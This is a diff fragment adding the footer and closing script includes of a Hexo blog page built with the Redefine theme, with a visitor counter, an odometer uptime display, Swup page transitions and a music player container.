+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">henry</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.6</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
